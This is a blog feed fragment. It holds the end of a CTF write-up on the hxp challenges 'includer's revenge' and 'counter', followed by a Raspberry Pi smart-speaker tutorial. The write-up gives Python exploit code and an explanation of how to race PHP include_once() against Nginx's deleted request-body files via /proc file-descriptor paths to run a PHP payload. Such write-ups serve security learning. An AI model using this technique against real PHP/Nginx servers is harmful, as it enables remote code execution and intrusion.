style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;#x2F;fd&amp;#x2F;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;{&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;fd&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;}&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;try&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            d &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;requests_session.get(SERVER &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;f&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;#x2F;?action=include&amp;amp;amp;file=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;{path}&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;.text
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;except&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;continue
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# Flags are formatted as hxp{&amp;amp;lt;flag&amp;amp;gt;}
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;if &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;hxp&amp;amp;quot; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;in &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;d:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;print&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;Found flag! &amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;print&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(d)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;def &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;read_file_worker&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;requests_session&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;nginx_pid&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;nginx_pids&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;):
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# Scan Nginx FDs between 10 - 45 in a loop. Since files and sockets keep closing - it&amp;amp;#39;s very common for the request body FD to open within this range
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;for &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;fd &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;in &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;range&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;10&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;45&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        thread &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;threading.Thread(target &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;read_file, args &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(requests_session, nginx_pid, fd, nginx_pids))
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;thread.start()
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;def &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;read_file_multiprocess&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;requests_session&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;nginx_pids&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;):
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;for &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;nginx_pid &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;in &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;nginx_pids:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        p &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;multiprocessing.Process(target&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;read_file_worker, args&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(requests_session, nginx_pid, nginx_pids))
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;p.start()
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;if &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;__name__ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;== &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;__main__&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;print&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;[DEBUG] Creating requests session&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    requests_session &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;create_requests_session()
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;print&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;[DEBUG] Getting Nginx pids&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    nginx_pids &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;get_nginx_pids(requests_session)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;print&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;f&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;[DEBUG] Nginx pids: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;{nginx_pids}&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;print&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;[DEBUG] Starting payload sending&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;send_payload_multiprocess(requests_session)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;print&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;[DEBUG] Starting fd readers&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;read_file_multiprocess(requests_session, nginx_pids)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;Our exploit tries to get PHP to &amp;lt;code&amp;gt;include_once()&amp;lt;&amp;#x2F;code&amp;gt; Nginx’s request body temporary file before it’s deleted. In order to do that, we need to constantly create many HTTP requests with our payload as a (large) request body, as fast as possible.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;We use a &amp;lt;code&amp;gt;requests.Session&amp;lt;&amp;#x2F;code&amp;gt; object with a large pool configured in order to speed up our HTTP requests and reduce the TCP handshake overhead.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Afterwards, we loop over the processes to see which ones are Nginx workers, since we’ll need their PIDs to build the FD path leading to the request body files.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;After creating the session and retrieving the Nginx worker PIDs (if cache wasn’t used) - we run the main exploit logic in parallel by leveraging Python’s &amp;lt;code&amp;gt;multiprocessing&amp;lt;&amp;#x2F;code&amp;gt; (threads might won’t be enough in this case due to GIL):&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;ul&amp;gt;
&amp;lt;li&amp;gt;We create a subprocess per CPU (in &amp;lt;code&amp;gt;send_payload_multiprocess()&amp;lt;&amp;#x2F;code&amp;gt;) and use that to constantly (&amp;lt;code&amp;gt;while True&amp;lt;&amp;#x2F;code&amp;gt;) send HTTP requests with a large request body containing our PHP payload (&amp;lt;code&amp;gt;system(&amp;quot;&amp;#x2F;runflag&amp;quot;)&amp;lt;&amp;#x2F;code&amp;gt; for these challenges). We used (nearly) 1MB payloads but anything between 16KB - 1MB should work (Nginx rejects request bodies larger than 1MB by default). The number of CPUs is crucial here since we need to create files fast enough to win the race.&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;We create a subprocess per Nginx worker with a thread for every FD (between 10 - 45). Each thread triggers the PHP &amp;lt;code&amp;gt;include_once()&amp;lt;&amp;#x2F;code&amp;gt; for &amp;lt;code&amp;gt;&amp;#x2F;proc&amp;#x2F;&amp;amp;lt;nginx worker pid&amp;amp;gt;&amp;#x2F;fd&amp;#x2F;&amp;amp;lt;fd&amp;amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;, while adding a randomly-generated prefix of chained paths as described above.&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;&amp;#x2F;ul&amp;gt;
&amp;lt;h2 id=&amp;quot;winning-the-race&amp;quot;&amp;gt;Winning the Race&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;The code in the implementation above worked pretty quickly on &amp;lt;code&amp;gt;includer&amp;#x27;s revenge&amp;lt;&amp;#x2F;code&amp;gt; both locally and on the remote server. But when running against &amp;lt;code&amp;gt;counter&amp;lt;&amp;#x2F;code&amp;gt; - we couldn’t get it to work remotely. The following code is taken from &amp;lt;code&amp;gt;counter&amp;lt;&amp;#x2F;code&amp;gt;‘s server:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;php&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-php &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-php&amp;quot; data-lang=&amp;quot;php&amp;quot;&amp;gt;&amp;lt;span&amp;gt;file_put_contents($page, file_get_contents($page) + 1);
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;include_once($page);
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;In addition to the Nginx creation and deletion race we now have another race - we need &amp;lt;code&amp;gt;file_put_contents()&amp;lt;&amp;#x2F;code&amp;gt; to write to the path before the content is in it, and &amp;lt;code&amp;gt;include_once()&amp;lt;&amp;#x2F;code&amp;gt; to be executed after Nginx writes the request body into it. This made us think - what happens when &amp;lt;code&amp;gt;file_put_contents()&amp;lt;&amp;#x2F;code&amp;gt; is called on the Nginx FD path after it’s deleted? When we looked into the request body directory (&amp;lt;code&amp;gt;&amp;#x2F;var&amp;#x2F;lib&amp;#x2F;nginx&amp;#x2F;body&amp;#x2F;&amp;lt;&amp;#x2F;code&amp;gt;) it was full with files formatted as &amp;lt;code&amp;gt;0000001337 (deleted)&amp;lt;&amp;#x2F;code&amp;gt; (the number is Nginx’s auto-incremented file format). These files filled 80% of our local Docker’s storage, but when querying the remote server (reading &amp;lt;code&amp;gt;&amp;#x2F;sys&amp;#x2F;block&amp;#x2F;sda&amp;#x2F;sda1&amp;#x2F;size&amp;lt;&amp;#x2F;code&amp;gt; via PHP) we found they have much more storage than us and we should be OK 🙂&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Even though the exploit worked locally for &amp;lt;code&amp;gt;counter&amp;lt;&amp;#x2F;code&amp;gt; (while filling the storage) - we couldn’t get it to work remotely, since winning the race is much less probable. Sniffing the traffic showed that there’s too much latency and packet loss at the rates we’re sending. Geo-locating the remote server showed that it’s in Germany while the exploit was running from US.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;We decided to purchase a VPS in Azure in the Germany region. Running the script there improved the Nginx PID retrieval significantly (30 seconds to 5 seconds) but the exploit still didn’t show results. Eventually, we noticed the new VPS only had 4 cores. We spent a few more $ to buy a 16-core VM in Germany, and got the flag within 5 seconds!&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;The conclusion - always use money to solve your problems!&amp;lt;&amp;#x2F;p&amp;gt;
</content>
        </entry>
        
    
        
        <entry>
            <title>Bathroom Smart Speaker using UE Boom, Raspberry Pi, Spotify and Home Assistant</title>
            <link href="https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2021-09-16-bathroom-smart-speaker-using-ue-boom-raspberry-pi-spotify-and-home-assistant&#x2F;"/>
            <updated>2021-09-16T00:00:00+0000</updated>
            <id>https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2021-09-16-bathroom-smart-speaker-using-ue-boom-raspberry-pi-spotify-and-home-assistant&#x2F;</id>
            <content type="html">&amp;lt;h2 id=&amp;quot;goal&amp;quot;&amp;gt;Goal&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;We’re going to build a smart speaker system that can play tropical forest sounds (or any other Spotify playlist) on demand from Home Assistant, and support Spotify Connect connectivity to cast music from other Spotify clients (if you want to put your own music while showering).&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;why&amp;quot;&amp;gt;Why?&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;Who doesn’t like showering with music? And if you already put a speaker in your bathroom, why not put some tropical background sounds while you’re at it?&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;hardware-requirements&amp;quot;&amp;gt;Hardware Requirements&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;I’m using the following hardware for my setup:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;ul&amp;gt;
&amp;lt;li&amp;gt;&amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;www.ultimateears.com&amp;#x2F;en-us&amp;#x2F;wireless-speakers&amp;#x2F;boom-3.html&amp;quot;&amp;gt;UE &amp;lt;&amp;#x2F;a&amp;gt;&amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;www.ultimateears.com&amp;#x2F;en-us&amp;#x2F;wireless-speakers&amp;#x2F;boom-3.html&amp;quot;&amp;gt;Boom&amp;lt;&amp;#x2F;a&amp;gt; (I’m actually using UE Boom 2 but any UE Boom would work).&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;&amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;www.raspberrypi.org&amp;#x2F;products&amp;#x2F;raspberry-pi-zero-w&amp;#x2F;&amp;quot;&amp;gt;Raspberry Pi Zero W&amp;lt;&amp;#x2F;a&amp;gt; (any Raspberry Pi with Bluetooth will work. Make sure it’ll also have WiFi since most bathrooms don’t have an Ethernet port).
&amp;lt;ul&amp;gt;
&amp;lt;li&amp;gt;microSD card and power adapter for the Raspberry Pi.&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;&amp;#x2F;ul&amp;gt;
&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;Optional: &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;www.aqara.com&amp;#x2F;us&amp;#x2F;motion_sensor.html&amp;quot;&amp;gt;Aqara Motion Sensor&amp;lt;&amp;#x2F;a&amp;gt; + &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;www.phoscon.de&amp;#x2F;en&amp;#x2F;conbee2&amp;quot;&amp;gt;ConBee II&amp;lt;&amp;#x2F;a&amp;gt; (if you want to turn music on &amp;#x2F; off based on motion).&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;&amp;#x2F;ul&amp;gt;
&amp;lt;h2 id=&amp;quot;additional-requirements&amp;quot;&amp;gt;Additional Requirements&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;ul&amp;gt;
&amp;lt;li&amp;gt;&amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;www.home-assistant.io&amp;#x2F;&amp;quot;&amp;gt;Home Assistant&amp;lt;&amp;#x2F;a&amp;gt; installation in LAN.&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;Spotify Premium account.&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;&amp;#x2F;ul&amp;gt;
&amp;lt;h2 id=&amp;quot;steps&amp;quot;&amp;gt;Steps&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;h3 id=&amp;quot;preparing-the-raspberry-pi&amp;quot;&amp;gt;Preparing the Raspberry Pi&amp;lt;&amp;#x2F;h3&amp;gt;
&amp;lt;p&amp;gt;Install &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;www.raspberrypi.org&amp;#x2F;software&amp;#x2F;&amp;quot;&amp;gt;Raspberry Pi OS&amp;lt;&amp;#x2F;a&amp;gt; on your device by using software such as &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;www.raspberrypi.org&amp;#x2F;documentation&amp;#x2F;computers&amp;#x2F;getting-started.html#using-raspberry-pi-imager&amp;quot;&amp;gt;Raspberry Pi Imager&amp;lt;&amp;#x2F;a&amp;gt;. I chose to install the &amp;quot;Raspberry Pi OS with desktop&amp;quot; flavor.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h3 id=&amp;quot;installing-raspotify&amp;quot;&amp;gt;Installing Raspotify&amp;lt;&amp;#x2F;h3&amp;gt;
&amp;lt;p&amp;gt;Once the RPi is installed and connected to your local network, connect via SSH and run the following command to install &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;dtcooper&amp;#x2F;raspotify&amp;quot;&amp;gt;Raspotify&amp;lt;&amp;#x2F;a&amp;gt; - the Spotify connect server for Raspberry Pi:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# Install Raspotify
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;curl -sL https:&amp;#x2F;&amp;#x2F;dtcooper.github.io&amp;#x2F;raspotify&amp;#x2F;install.sh &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;| &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sh
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
